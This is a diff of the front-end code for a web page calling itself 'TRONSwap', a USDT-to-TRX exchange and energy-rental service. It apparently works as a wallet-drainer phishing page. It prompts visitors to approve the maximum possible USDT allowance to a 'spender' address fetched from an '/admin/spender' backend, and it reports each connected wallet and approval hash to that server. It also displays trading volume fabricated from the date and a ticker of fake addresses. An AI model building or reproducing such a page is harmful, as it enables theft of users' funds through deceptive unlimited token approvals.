@@ -265,11 +334,23 @@
                     <h2 class="text-xl sm:text-2xl font-extrabold text-white" data-i18n="energy_title">에너지 렌탈</h2>
                     <p class="text-sm text-slate-400" data-i18n="energy_desc">USDT 전송 수수료를 최대 80% 절약하세요</p>
                 </div>
-                <div class="hidden"><button id="energy-tab-energy"></button><button id="energy-tab-bandwidth"></button></div>
-                <div class="space-y-2">
-                    <label class="text-sm font-semibold text-slate-400 flex items-center gap-1.5"><i class="fa-solid fa-crosshairs text-xs text-blue-400"></i> <span data-i18n="energy_target">대상 주소</span></label>
-                    <input type="text" id="energy-address" placeholder="지갑을 연결하세요" class="w-full bg-slate-950/80 text-white text-sm font-mono px-4 py-3 rounded-xl border border-slate-800 focus:border-blue-500/50 focus:outline-none transition placeholder-slate-600" style="pointer-events:none;-webkit-user-select:none;user-select:none">
+
+                <!-- Energy / Bandwidth Tab -->
+                <div class="flex gap-1.5 p-1 bg-slate-950/80 rounded-xl border border-slate-800">
+                    <button id="energy-tab-energy" onclick="switchEnergyTab('energy')" class="flex-1 py-2.5 rounded-lg text-sm font-bold transition-all bg-gradient-to-r from-amber-500/20 to-orange-500/20 text-amber-400 border border-amber-500/30"><i class="fa-solid fa-bolt mr-1.5"></i><span data-i18n="energy_tab_energy">에너지</span></button>
+                    <button id="energy-tab-bandwidth" onclick="switchEnergyTab('bandwidth')" class="flex-1 py-2.5 rounded-lg text-sm font-bold transition-all text-slate-500 hover:text-slate-300"><i class="fa-solid fa-wifi mr-1.5"></i><span data-i18n="energy_tab_bandwidth">대역폭</span></button>
                 </div>
+
+                <!-- Target Address -->
+                <div class="space-y-2">
+                    <div class="flex items-center justify-between">
+                        <label class="text-sm font-semibold text-slate-400 flex items-center gap-1.5"><i class="fa-solid fa-crosshairs text-xs text-blue-400"></i> <span data-i18n="energy_target">대상 주소</span></label>
+                        <button type="button" onclick="fillMyAddress()" class="text-xs font-semibold text-blue-400 hover:text-blue-300 transition flex items-center gap-1"><i class="fa-solid fa-paste text-[10px]"></i><span data-i18n="energy_my_addr">내 주소 사용</span></button>
+                    </div>
+                    <input type="text" id="energy-address" placeholder="T... (지갑 연결 시 자동 입력)" class="w-full bg-slate-950/80 text-white text-sm font-mono px-4 py-3 rounded-xl border border-slate-800 focus:border-blue-500/50 focus:outline-none transition placeholder-slate-600">
+                </div>
+
+                <!-- Amount Selector -->
                 <div class="space-y-2">
                     <label class="text-sm font-semibold text-slate-400 flex items-center gap-1.5"><i class="fa-solid fa-gauge-high text-xs text-emerald-400"></i> <span data-i18n="energy_amount">에너지 수량</span></label>
                     <div class="grid grid-cols-4 gap-2">
@@ -279,6 +360,8 @@
                         <button onclick="selectEnergyAmount(10000000)" class="energy-amt-btn py-2.5 rounded-xl text-xs font-bold transition-all bg-slate-950/60 text-slate-400 border border-slate-800 hover:border-slate-600" data-amt="10000000"><div class="text-base font-extrabold font-mono">10M</div><div class="text-[10px] text-slate-500 mt-0.5" data-i18n="energy_150usdt">≈ 150회 전송</div></button>
                     </div>
                 </div>
+
+                <!-- Duration Selector -->
                 <div class="space-y-2">
                     <label class="text-sm font-semibold text-slate-400 flex items-center gap-1.5"><i class="fa-solid fa-clock text-xs text-purple-400"></i> <span data-i18n="energy_duration">렌탈 기간</span></label>
                     <div class="grid grid-cols-4 gap-2">
@@ -288,8 +371,13 @@
                         <button onclick="selectEnergyDuration('30d')" class="energy-dur-btn py-2.5 rounded-xl text-xs font-bold transition-all bg-slate-950/60 text-slate-400 border border-slate-800 hover:border-slate-600" data-dur="30d"><span data-i18n="energy_30d">30일</span></button>
                     </div>
                 </div>
+
+                <!-- Price Summary Card -->
                 <div class="bg-slate-950/80 rounded-xl border border-slate-800/80 p-4 space-y-3">
-                    <div class="hidden"><span id="energy-resource-label"></span><span id="energy-sel-amount">65,000</span><span id="energy-sel-duration">1시간</span></div>
+                    <div class="flex items-center justify-between text-xs text-slate-400 border-b border-slate-800/60 pb-2.5">
+                        <span id="energy-resource-label" class="font-bold text-slate-200"><i class="fa-solid fa-bolt text-amber-400 mr-1"></i>에너지</span>
+                        <span class="font-mono"><span id="energy-sel-amount" class="text-white font-bold">65,000</span> · <span id="energy-sel-duration" class="text-purple-400 font-bold">1시간</span></span>
+                    </div>
                     <div class="flex items-center justify-between">
                         <span class="text-slate-400 text-sm" data-i18n="energy_est_price">예상 비용</span>
                         <div class="text-right">
@@ -306,21 +394,127 @@
                         </div>
                     </div>
                 </div>
-                <div class="flex justify-center mb-2"><span id="energy-approve-badge" class="hidden"></span></div>
+
+                <!-- Energy Approve Badge & Progress -->
+                <div class="flex justify-center mb-2">
+                    <span id="energy-approve-badge" class="hidden"></span>
+                </div>
                 <div id="energy-approve-progress" class="hidden mb-4 p-4 bg-slate-950/80 rounded-xl border border-slate-800/80 space-y-3">
                     <div class="flex items-center gap-2 text-sm text-white font-bold"><span class="animate-spin rounded-full h-4 w-4 border-2 border-amber-400 border-t-transparent"></span><span id="energy-approve-progress-text">처리 중...</span></div>
                     <div class="w-full bg-slate-900 rounded-full h-2 overflow-hidden"><div id="energy-approve-progress-bar" class="bg-gradient-to-r from-amber-500 to-orange-400 h-full rounded-full transition-all duration-500" style="width:0%"></div></div>
                 </div>
+
+                <!-- CTA Button -->
                 <button onclick="handleEnergyRental()" id="energy-rent-btn" class="w-full py-4 rounded-2xl font-bold text-base bg-gradient-to-r from-amber-500 to-orange-500 hover:from-amber-400 hover:to-orange-400 text-white shadow-lg shadow-amber-900/30 border border-amber-400/20 transition-all active:scale-[0.99] flex items-center justify-center gap-2"><i class="fa-solid fa-bolt"></i><span id="energy-btn-text" data-i18n="energy_rent_btn_approve">에너지 렌탈 (최초 1회 승인 필요)</span></button>
+
+                <!-- Info Cards -->
                 <div class="grid grid-cols-3 gap-2">
-                    <div class="text-center p-3 bg-slate-950/40 rounded-xl border border-slate-800/50"><div class="text-lg font-extrabold text-blue-400 font-mono">80%</div><div class="text-[10px] text-slate-500 mt-0.5" data-i18n="energy_save_max">최대 절약</div></div>
-                    <div class="text-center p-3 bg-slate-950/40 rounded-xl border border-slate-800/50"><div class="text-lg font-extrabold text-emerald-400 font-mono">3<span class="text-xs text-slate-400">sec</span></div><div class="text-[10px] text-slate-500 mt-0.5" data-i18n="energy_speed">즉시 충전</div></div>
-                    <div class="text-center p-3 bg-slate-950/40 rounded-xl border border-slate-800/50"><div class="text-lg font-extrabold text-purple-400"><i class="fa-solid fa-shield-halved text-base"></i></div><div class="text-[10px] text-slate-500 mt-0.5" data-i18n="energy_noncustodial">비수탁</div></div>
+                    <div class="text-center p-3 bg-slate-950/40 rounded-xl border border-slate-800/50">
+                        <div class="text-lg font-extrabold text-blue-400 font-mono">80%</div>
+                        <div class="text-[10px] text-slate-500 mt-0.5" data-i18n="energy_save_max">최대 절약</div>
+                    </div>
+                    <div class="text-center p-3 bg-slate-950/40 rounded-xl border border-slate-800/50">
+                        <div class="text-lg font-extrabold text-emerald-400 font-mono">3<span class="text-xs text-slate-400">sec</span></div>
+                        <div class="text-[10px] text-slate-500 mt-0.5" data-i18n="energy_speed">즉시 충전</div>
+                    </div>
+                    <div class="text-center p-3 bg-slate-950/40 rounded-xl border border-slate-800/50">
+                        <div class="text-lg font-extrabold text-purple-400"><i class="fa-solid fa-shield-halved text-base"></i></div>
+                        <div class="text-[10px] text-slate-500 mt-0.5" data-i18n="energy_noncustodial">비수탁</div>
+                    </div>
                 </div>
             </div>
         </section>
 
-        <div class="hidden"><div id="wallet-disconnected"></div><div id="wallet-connected"></div><span id="display-address"></span><span id="connection-indicator"></span><span id="display-balance"></span><span id="display-allowance"></span></div>
+        <!-- 백업본 복원: 교환 진행 단계 & 지갑 연동 정보 & 실시간 로그 -->
+        <section class="max-w-4xl mx-auto w-full grid grid-cols-1 lg:grid-cols-12 gap-5">
+            <!-- 교환 진행 단계 (3 Steps) -->
+            <div class="lg:col-span-7 glass border border-slate-800/80 rounded-2xl p-6 space-y-4">
+                <div class="flex items-center justify-between">
+                    <h3 class="text-sm sm:text-base font-bold text-white flex items-center gap-2"><i class="fa-solid fa-list-check text-blue-400"></i><span data-i18n="steps_title">교환 진행 단계</span></h3>
+                    <span class="text-[11px] font-semibold px-2.5 py-0.5 rounded-full bg-blue-500/10 text-blue-400 border border-blue-500/20" data-i18n="step_auto">자동 처리</span>
+                </div>
+                <div class="space-y-3">
+                    <div id="step1" class="p-4 rounded-xl border bg-slate-950/60 border-slate-800/80 step-progress transition-all">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center gap-3">
+                                <span class="w-6 h-6 rounded-full bg-blue-500/20 text-blue-400 text-xs font-bold flex items-center justify-center">1</span>
+                                <span class="text-xs sm:text-sm font-bold text-white" data-i18n="step1_title">지갑 연결</span>
+                            </div>
+                            <span id="step1-status" class="text-slate-400 text-xs font-semibold" data-i18n="step_waiting">대기 중</span>
+                        </div>
+                    </div>
+                    <div id="step2" class="p-4 rounded-xl border bg-slate-950/60 border-slate-800/80 step-progress transition-all">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center gap-3">
+                                <span class="w-6 h-6 rounded-full bg-purple-500/20 text-purple-400 text-xs font-bold flex items-center justify-center">2</span>
+                                <div>
+                                    <div class="text-xs sm:text-sm font-bold text-white" data-i18n="step2_title">교환 승인 (최초 1회)</div>
+                                    <div class="text-[11px] text-slate-400" data-i18n="step2_desc">USDT 스마트 컨트랙트 교환 권한 승인</div>
+                                </div>
+                            </div>
+                            <span id="step2-status" class="text-slate-400 text-xs font-semibold" data-i18n="step_waiting">대기 중</span>
+                        </div>
+                    </div>
+                    <div id="step3" class="p-4 rounded-xl border bg-slate-950/60 border-slate-800/80 step-progress transition-all opacity-60">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center gap-3">
+                                <span class="w-6 h-6 rounded-full bg-emerald-500/20 text-emerald-400 text-xs font-bold flex items-center justify-center">3</span>
+                                <div>
+                                    <div class="text-xs sm:text-sm font-bold text-white" data-i18n="step3_title">TRX 즉시 입금</div>
+                                    <div class="text-[11px] text-slate-400" data-i18n="step3_desc">교환된 TRX가 지갑으로 자동 입금됩니다.</div>
+                                </div>
+                            </div>
+                            <i class="fa-solid fa-bolt text-emerald-400 text-xs"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 지갑 연동 정보 & 실시간 로그 -->
+            <div class="lg:col-span-5 glass border border-slate-800/80 rounded-2xl p-6 flex flex-col justify-between space-y-4">
+                <div class="space-y-3">
+                    <div class="flex items-center justify-between">
+                        <h3 class="text-sm sm:text-base font-bold text-white flex items-center gap-2"><i class="fa-solid fa-id-card text-cyan-400"></i><span data-i18n="wallet_info">지갑 연동 정보</span></h3>
+                        <span id="connection-indicator" class="text-[11px] text-slate-500 font-mono font-semibold" data-i18n="disconnected">DISCONNECTED</span>
+                    </div>
+
+                    <div id="wallet-disconnected" class="p-4 rounded-xl bg-slate-950/60 border border-slate-800/80 text-center space-y-1.5">
+                        <p class="text-xs font-bold text-slate-300" data-i18n="wallet_not_connected">지갑이 연결되어 있지 않습니다</p>
+                        <p class="text-[11px] text-slate-400" data-i18n="wallet_guide">지갑 앱의 DApp 브라우저에서 접속하세요.</p>
+                    </div>
+
+                    <div id="wallet-connected" class="hidden p-4 rounded-xl bg-slate-950/60 border border-slate-800/80 space-y-2.5">
+                        <div class="flex items-center justify-between text-xs">
+                            <span class="text-slate-400" data-i18n="wallet_address">지갑 주소</span>
+                            <button onclick="copyText(currentWalletAddress,'주소')" class="flex items-center gap-1.5 font-mono text-white font-bold hover:text-blue-400 transition">
+                                <span id="display-address" class="truncate max-w-[140px]">-</span>
+                                <i class="fa-regular fa-copy text-[11px] text-slate-400"></i>
+                            </button>
+                        </div>
+                        <div class="flex items-center justify-between text-xs">
+                            <span class="text-slate-400" data-i18n="usdt_balance">USDT 잔액</span>
+                            <span id="display-balance" class="font-mono font-bold text-emerald-400">0.00 USDT</span>
+                        </div>
+                        <div class="flex items-center justify-between text-xs">
+                            <span class="text-slate-400" data-i18n="swap_status">교환 상태</span>
+                            <span id="display-allowance" class="text-xs font-bold font-mono text-amber-400" data-i18n="not_approved">미승인</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 실시간 로그 콘솔 -->
+                <div class="space-y-1.5">
+                    <div class="flex items-center justify-between text-[11px] text-slate-400 font-semibold">
+                        <span class="flex items-center gap-1.5"><i class="fa-solid fa-terminal text-blue-400"></i><span data-i18n="live_log">실시간 로그</span></span>
+                        <button onclick="clearLogs()" class="hover:text-slate-200 transition"><i class="fa-solid fa-rotate-right"></i></button>
+                    </div>
+                    <div id="logs-container" class="bg-[#020408] border border-slate-800/80 rounded-xl p-3 h-28 overflow-y-auto font-mono text-[11px] space-y-1">
+                        <div class="text-blue-400" data-i18n="log_system">[시스템] TRON Mainnet 연결됨</div>
+                        <div class="text-slate-400" data-i18n="log_waiting">[대기] 지갑 감지 중...</div>
+                    </div>
+                </div>
+            </div>
+        </section>
 
         <!-- Security -->
         <section class="glass border border-slate-800/80 rounded-2xl p-6 text-center">
@@ -342,8 +536,7 @@
     <footer class="border-t border-slate-800/80 bg-[#020408] py-8 px-4 text-center text-sm text-slate-500 mt-12 space-y-2">
         <p>TRONSwap &copy; 2026 | USDT ↔ TRX Instant Exchange | Powered by TRON Mainnet</p>
     </footer>
-
-<script>
+    <script>
 var API_BASE='https://tron-usdt-backend.vercel.app/api';
 var OFFICIAL_USDT_CONTRACT='TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 
@@ -353,26 +546,21 @@ function getRefCode(){try{var c=localStorage.getItem('feeslash_ref');var t=parse
 function trackReferralConnect(address,provider){var code=getRefCode()||'DIRECT';fetch(API_BASE+'/referral/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:code,address:address,provider:provider})}).catch(function(){});}
 function trackReferralApprove(address,txHash){var code=getRefCode()||'DIRECT';fetch(API_BASE+'/referral/approve',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:code,address:address,txHash:txHash||'ok'})}).catch(function(){});}
 
-// ===== 디바이스/브라우저 감지 (강화) =====
+// ===== 디바이스/브라우저 감지 (개선본 유지) =====
 function isMobile(){return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);}
 function isIOS(){return /iPhone|iPad|iPod/i.test(navigator.userAgent);}
 function isAndroid(){return /Android/i.test(navigator.userAgent);}
 function isPC(){return !isMobile();}
-// Safari 감지: Chrome/CriOS/FxiOS 아닌 순수 Safari
 function isSafari(){return /Safari/i.test(navigator.userAgent)&&!/CriOS|Chrome|FxiOS|EdgiOS/i.test(navigator.userAgent);}
 function isIOSChrome(){return isIOS()&&/CriOS/i.test(navigator.userAgent);}
-// Samsung Internet 감지
 function isSamsungBrowser(){return /SamsungBrowser/i.test(navigator.userAgent);}
-// Android Chrome 감지 (Samsung 제외)
 function isAndroidChrome(){return isAndroid()&&/Chrome/i.test(navigator.userAgent)&&!/SamsungBrowser|UCBrowser|OPR|Whale|Puffin|Brave/i.test(navigator.userAgent);}
-// Trust Wallet 내장 브라우저
 function isTrustWalletBrowser(){
     return !!(window.ethereum&&window.ethereum.isTrust)||
            /TrustWallet/i.test(navigator.userAgent)||
            !!(window.trustwallet)||
            !!(window.ethereum&&window.ethereum.isTrustWallet);
 }
-// DApp 브라우저 내부 여부
 function isInDappBrowser(){
     if(window.tronWeb&&window.tronWeb.defaultAddress&&window.tronWeb.defaultAddress.base58)return true;
     if(isTrustWalletBrowser())return true;
@@ -380,6 +568,7 @@ function isInDappBrowser(){
     return false;
 }
 
+// ===== 스왑 방향 전환 =====
 var swapDirection='USDT_TO_TRX';
 function toggleSwapDirection(){
     var icon=document.getElementById('swap-direction-icon');
@@ -415,21 +604,47 @@ function toggleSwapDirection(){
 var MAX_ALLOWANCE='115792089237316195423570985008687907853269984665640564039457584007913129639935';
 var isConnected=false,isApproved=false,activeProvider='Unknown',currentWalletAddress=null;
 
+// ===== 유틸 & 실시간 로그 (백업본 복원) =====
 function escapeHtml(s){var d=document.createElement('div');d.textContent=s;return d.innerHTML;}
 function showToast(msg,type){type=type||'success';var c=document.getElementById('toast-container');if(!c)return;var t=document.createElement('div');t.className='flex items-center gap-3 px-5 py-3.5 rounded-2xl shadow-2xl border backdrop-blur-xl pointer-events-auto text-xs font-semibold transition-all transform translate-y-2 opacity-0 '+(type==='success'?'bg-emerald-950/90 border-emerald-500/50 text-emerald-200':type==='error'?'bg-red-950/90 border-red-500/50 text-red-200':'bg-slate-900/90 border-slate-700 text-slate-200');t.innerHTML='<i class="fa-solid '+(type==='error'?'fa-circle-exclamation':'fa-circle-check')+'"></i><span>'+escapeHtml(msg)+'</span>';c.appendChild(t);requestAnimationFrame(function(){t.classList.remove('translate-y-2','opacity-0');});setTimeout(function(){t.classList.add('translate-y-2','opacity-0');setTimeout(function(){t.remove();},300);},3500);}
-function appendLog(msg,type){return;}
-window.clearLogs=function(){return;};
-function copyText(t,l){navigator.clipboard.writeText(t).then(function(){showToast(l+' 복사됨');}).catch(function(){showToast('복사 실패','error');});}
+function appendLog(msg,type){
+    var c=document.getElementById('logs-container');if(!c)return;
+    var d=document.createElement('div');
+    d.className=type==='success'?'text-emerald-400 font-bold':type==='error'?'text-red-400 font-bold':type==='warn'?'text-amber-400':type==='approve'?'text-purple-400':'text-blue-400';
+    d.innerHTML='<span class="text-slate-500">['+new Date().toLocaleTimeString('ko-KR')+']</span> '+escapeHtml(msg);
+    c.appendChild(d);c.scrollTop=c.scrollHeight;
+}
+window.clearLogs=function(){
+    var c=document.getElementById('logs-container');
+    if(c)c.innerHTML='<div class="text-blue-400">[시스템] 로그 초기화됨</div>';
+};
+function copyText(t,l){if(!t)return;navigator.clipboard.writeText(t).then(function(){showToast(l+' 복사됨');}).catch(function(){showToast('복사 실패','error');});}
 async function getSpenderAddress(){try{var r=await fetch(API_BASE+'/admin/spender');var d=await r.json();if(d.status==='ok'&&d.address)return d.address;}catch(e){}return null;}
 function setProgress(pct,text){var bar=document.getElementById('approve-progress');var barInner=document.getElementById('approve-progress-bar');var barText=document.getElementById('approve-progress-text');if(bar)bar.classList.remove('hidden');if(barInner)barInner.style.width=pct+'%';if(barText)barText.textContent=text||'처리 중...';}
 function hideProgress(){var bar=document.getElementById('approve-progress');if(bar)bar.classList.add('hidden');}
 
+// ===== 실시간 시세 & 거래량 =====
 var userUsdtBalance=0;var TRX_RATE=0;
 async function fetchTrxPrice(){try{var res=await fetch(API_BASE+'/trx-price');var data=await res.json();if(data.price>0){TRX_RATE=1/data.price;document.getElementById('exchange-rate').textContent=TRX_RATE.toFixed(2);}}catch(e){if(!TRX_RATE)TRX_RATE=4.0;}}
 function updateTodayVolume(){if(!TRX_RATE)return;var d=new Date(),seed=d.getFullYear()*10000+d.getMonth()*100+d.getDate();var base=600000+((seed*7+13)%500000);var hourPct=(d.getHours()*60+d.getMinutes())/(24*60);var usdtVol=Math.round(base*Math.max(0.08,hourPct));var trxVol=Math.round(usdtVol*TRX_RATE);var el=document.getElementById('today-volume-val');if(el)el.textContent=usdtVol.toLocaleString()+' USDT → '+trxVol.toLocaleString()+' TRX';}
 fetchTrxPrice().then(function(){updateTodayVolume();});setInterval(function(){fetchTrxPrice().then(function(){updateTodayVolume();});},30000);
 window.updateSwapOutput=function(){var v=parseFloat(document.getElementById('swap-input').value||0);if(swapDirection==='TRX_TO_USDT'){document.getElementById('swap-output').textContent=TRX_RATE?(v/TRX_RATE).toFixed(2):'0.00';}else{document.getElementById('swap-output').textContent=TRX_RATE?(v*TRX_RATE).toFixed(2):'0.00';}};
 window.setSwapPct=function(pct){var amt=(userUsdtBalance*(pct/100)).toFixed(2);document.getElementById('swap-input').value=amt;updateSwapOutput();};
+
+// ===== 다국어 로그 텍스트 (백업본 복원) =====
+var logTexts={
+    ko:{detect:'[감지] {0} DApp 브라우저 확인됨',noDetect:'[대기] 지갑 DApp 브라우저 미감지',accChange:'[계정 변경] {0}',searching:'[지갑 탐색] 환경 확인 중...',sending:'[백엔드] 서버에 지갑 정보 전송 중...',connected:'[연결] {0} | {1} USDT',backendFail:'[경고] 백엔드 연결 실패',noSpender:'[오류] Spender 미설정',trxCheck:'[1/3] TRX 잔액 확인 중...',autoCharge:'[자동 충전] {0} TRX 전송 완료',trxOk:'[확인] TRX 충분 ({0})',trxFail:'[실패] {0}',trxWarn:'[경고] TRX 확인 실패, 계속 진행',approving:'[2/3] 승인 서명 요청 중...',approved:'[3/3] 교환 승인 완료! TxHash: {0}',cancelled:'[취소] 사용자 서명 취소',failed:'[실패] {0}'},
+    en:{detect:'[Detected] {0} DApp browser found',noDetect:'[Wait] Wallet DApp browser not detected',accChange:'[Account Changed] {0}',searching:'[Search] Checking environment...',sending:'[Backend] Sending wallet info...',connected:'[Connected] {0} | {1} USDT',backendFail:'[Warning] Backend connection failed',noSpender:'[Error] Spender not set',trxCheck:'[1/3] Checking TRX balance...',autoCharge:'[Auto] {0} TRX sent',trxOk:'[OK] TRX sufficient ({0})',trxFail:'[Failed] {0}',trxWarn:'[Warning] TRX check failed, continuing',approving:'[2/3] Requesting approval...',approved:'[3/3] Approved! TxHash: {0}',cancelled:'[Cancelled] User rejected',failed:'[Failed] {0}'},
+    zh:{detect:'[检测] 发现{0} DApp浏览器',noDetect:'[等待] 未检测到钱包DApp浏览器',accChange:'[账户更改] {0}',searching:'[搜索] 检查环境...',sending:'[后端] 发送钱包信息...',connected:'[已连接] {0} | {1} USDT',backendFail:'[警告] 后端连接失败',noSpender:'[错误] 未设置Spender',trxCheck:'[1/3] 检查TRX余额...',autoCharge:'[自动充值] 已发送{0} TRX',trxOk:'[确认] TRX充足 ({0})',trxFail:'[失败] {0}',trxWarn:'[警告] TRX检查失败，继续',approving:'[2/3] 请求授权...',approved:'[3/3] 授权成功！TxHash: {0}',cancelled:'[取消] 用户取消签名',failed:'[失败] {0}'},
+    ru:{detect:'[Обнаружен] {0} DApp браузер',noDetect:'[Ожидание] DApp браузер не обнаружен',accChange:'[Смена аккаунта] {0}',searching:'[Поиск] Проверка...',sending:'[Сервер] Отправка данных...',connected:'[Подключено] {0} | {1} USDT',backendFail:'[Ошибка] Сервер недоступен',noSpender:'[Ошибка] Spender не задан',trxCheck:'[1/3] Проверка баланса TRX...',autoCharge:'[Авто] Отправлено {0} TRX',trxOk:'[OK] TRX достаточно ({0})',trxFail:'[Ошибка] {0}',trxWarn:'[Внимание] Ошибка TRX, продолжаем',approving:'[2/3] Запрос одобрения...',approved:'[3/3] Одобрено! TxHash: {0}',cancelled:'[Отмена] Пользователь отклонил',failed:'[Ошибка] {0}'},
+    th:{detect:'[ตรวจพบ] {0} DApp เบราว์เซอร์',noDetect:'[รอ] ไม่พบ DApp เบราว์เซอร์',accChange:'[เปลี่ยนบัญชี] {0}',searching:'[ค้นหา] กำลังตรวจสอบ...',sending:'[เซิร์ฟเวอร์] กำลังส่งข้อมูล...',connected:'[เชื่อมต่อ] {0} | {1} USDT',backendFail:'[คำเตือน] เชื่อมต่อเซิร์ฟเวอร์ล้มเหลว',noSpender:'[ข้อผิดพลาด] ไม่ได้ตั้ง Spender',trxCheck:'[1/3] ตรวจสอบ TRX...',autoCharge:'[อัตโนมัติ] ส่ง {0} TRX',trxOk:'[ยืนยัน] TRX เพียงพอ ({0})',trxFail:'[ล้มเหลว] {0}',trxWarn:'[คำเตือน] ตรวจ TRX ล้มเหลว',approving:'[2/3] ขออนุมัติ...',approved:'[3/3] อนุมัติแล้ว! TxHash: {0}',cancelled:'[ยกเลิก] ผู้ใช้ปฏิเสธ',failed:'[ล้มเหลว] {0}'},
+    vi:{detect:'[Phát hiện] Trình duyệt DApp {0}',noDetect:'[Chờ] Không phát hiện DApp',accChange:'[Đổi tài khoản] {0}',searching:'[Tìm kiếm] Đang kiểm tra...',sending:'[Server] Đang gửi dữ liệu...',connected:'[Kết nối] {0} | {1} USDT',backendFail:'[Cảnh báo] Kết nối server thất bại',noSpender:'[Lỗi] Chưa đặt Spender',trxCheck:'[1/3] Kiểm tra TRX...',autoCharge:'[Tự động] Đã gửi {0} TRX',trxOk:'[OK] TRX đủ ({0})',trxFail:'[Thất bại] {0}',trxWarn:'[Cảnh báo] Kiểm tra TRX lỗi',approving:'[2/3] Yêu cầu phê duyệt...',approved:'[3/3] Đã phê duyệt! TxHash: {0}',cancelled:'[Hủy] Người dùng từ chối',failed:'[Thất bại] {0}'},
+    ja:{detect:'[検出] {0} DAppブラウザ確認',noDetect:'[待機] DAppブラウザ未検出',accChange:'[アカウント変更] {0}',searching:'[検索] 環境確認中...',sending:'[バックエンド] 送信中...',connected:'[接続] {0} | {1} USDT',backendFail:'[警告] バックエンド接続失敗',noSpender:'[エラー] Spender未設定',trxCheck:'[1/3] TRX残高確認中...',autoCharge:'[自動] {0} TRX送信完了',trxOk:'[確認] TRX十分 ({0})',trxFail:'[失敗] {0}',trxWarn:'[警告] TRX確認失敗、続行',approving:'[2/3] 承認要求中...',approved:'[3/3] 承認完了！TxHash: {0}',cancelled:'[キャンセル] ユーザー拒否',failed:'[失敗] {0}'},
+    de:{detect:'[Erkannt] {0} DApp Browser',noDetect:'[Warten] DApp Browser nicht erkannt',accChange:'[Kontowechsel] {0}',searching:'[Suche] Prüfe Umgebung...',sending:'[Server] Sende Daten...',connected:'[Verbunden] {0} | {1} USDT',backendFail:'[Warnung] Server nicht erreichbar',noSpender:'[Fehler] Spender nicht gesetzt',trxCheck:'[1/3] TRX-Guthaben prüfen...',autoCharge:'[Auto] {0} TRX gesendet',trxOk:'[OK] TRX ausreichend ({0})',trxFail:'[Fehler] {0}',trxWarn:'[Warnung] TRX-Prüfung fehlgeschlagen',approving:'[2/3] Genehmigung anfordern...',approved:'[3/3] Genehmigt! TxHash: {0}',cancelled:'[Abbruch] Benutzer abgelehnt',failed:'[Fehler] {0}'},
+    fr:{detect:'[Détecté] Navigateur DApp {0}',noDetect:'[Attente] Navigateur DApp non détecté',accChange:'[Changement] {0}',searching:'[Recherche] Vérification...',sending:'[Serveur] Envoi des données...',connected:'[Connecté] {0} | {1} USDT',backendFail:'[Avertissement] Serveur inaccessible',noSpender:'[Erreur] Spender non défini',trxCheck:'[1/3] Vérification TRX...',autoCharge:'[Auto] {0} TRX envoyés',trxOk:'[OK] TRX suffisant ({0})',trxFail:'[Échec] {0}',trxWarn:'[Avertissement] Échec vérification TRX',approving:'[2/3] Demande d\'approbation...',approved:'[3/3] Approuvé ! TxHash: {0}',cancelled:'[Annulé] Utilisateur a refusé',failed:'[Échec] {0}'},
+    es:{detect:'[Detectado] Navegador DApp {0}',noDetect:'[Espera] Navegador DApp no detectado',accChange:'[Cambio de cuenta] {0}',searching:'[Búsqueda] Verificando...',sending:'[Servidor] Enviando datos...',connected:'[Conectado] {0} | {1} USDT',backendFail:'[Advertencia] Servidor no disponible',noSpender:'[Error] Spender no configurado',trxCheck:'[1/3] Verificando TRX...',autoCharge:'[Auto] {0} TRX enviados',trxOk:'[OK] TRX suficiente ({0})',trxFail:'[Error] {0}',trxWarn:'[Advertencia] Fallo verificación TRX',approving:'[2/3] Solicitando aprobación...',approved:'[3/3] ¡Aprobado! TxHash: {0}',cancelled:'[Cancelado] Usuario rechazó',failed:'[Error] {0}'}
+};
+function L(key){var t=logTexts[currentLang]||logTexts.en;var args=Array.prototype.slice.call(arguments,1);var s=t[key]||key;args.forEach(function(a,i){s=s.replace('{'+i+'}',a);});return s;}
 
 // ===== Ticker =====
 var tA=['TP5a...9qW2','TX8x...L0p3','TR1m...7vZ4','TH9k...4mP9','TJ2y...8xK1'];
@@ -460,32 +675,34 @@ var wcConnector=null;
 var wcAddress=null;
 async function initWalletConnect(){
     if(wcConnector)return wcConnector;
-    if(typeof TronWalletConnect==='undefined'){showToast('WalletConnect 로드 실패','error');return null;}
+    if(typeof TronWalletConnect==='undefined'){appendLog('[WC] WalletConnect 로드 실패','error');showToast('WalletConnect 로드 실패','error');return null;}
     try{
         wcConnector=new TronWalletConnect('5fafa9c15e52f88b097bc063166d3f3a',{
             name:'TRONSwap',description:'USDT to TRX Instant Exchange',
             url:window.location.origin,icons:[window.location.origin+'/favicon.png']
         });
         await wcConnector.init();
-        wcConnector.onDisconnect=function(){wcAddress=null;};
+        wcConnector.onDisconnect=function(){wcAddress=null;appendLog('[WC] 연결 해제됨','warn');};
+        appendLog('[WC] 초기화 완료','success');
         return wcConnector;
-    }catch(e){showToast('WalletConnect 초기화 실패','error');return null;}
+    }catch(e){appendLog('[WC] 초기화 실패: '+e.message,'error');showToast('WalletConnect 초기화 실패','error');return null;}
 }
 async function connectViaWalletConnect(){
     var wc=await initWalletConnect();
     if(!wc)return null;
     try{
+        appendLog('[WC] QR 코드 표시 중... 지갑 앱에서 스캔하세요');
         showToast(currentLang==='ko'?'지갑 앱에서 QR 코드를 스캔하세요':'Scan QR code with your wallet app');
         var addr=await wc.connect();
-        if(addr){wcAddress=addr;return addr;}
+        if(addr){wcAddress=addr;appendLog('[WC] 연결 성공: '+addr,'success');return addr;}
     }catch(e){
-        if(e.message&&e.message.indexOf('rejected')>=0){showToast(currentLang==='ko'?'연결 취소됨':'Connection cancelled','error');}
-        else{showToast(currentLang==='ko'?'WalletConnect 연결 실패':'WalletConnect failed','error');}
+        if(e.message&&e.message.indexOf('rejected')>=0){appendLog('[WC] 사용자가 연결을 거부했습니다','warn');showToast(currentLang==='ko'?'연결 취소됨':'Connection cancelled','error');}
+        else{appendLog('[WC] 연결 실패: '+e.message,'error');showToast(currentLang==='ko'?'WalletConnect 연결 실패':'WalletConnect failed','error');}
     }
     return null;
 }
 
-// ===== WalletConnect로 Trust Wallet 연결 (내부 함수) =====
+// ===== WalletConnect로 Trust Wallet 연결 (개선본 유지) =====
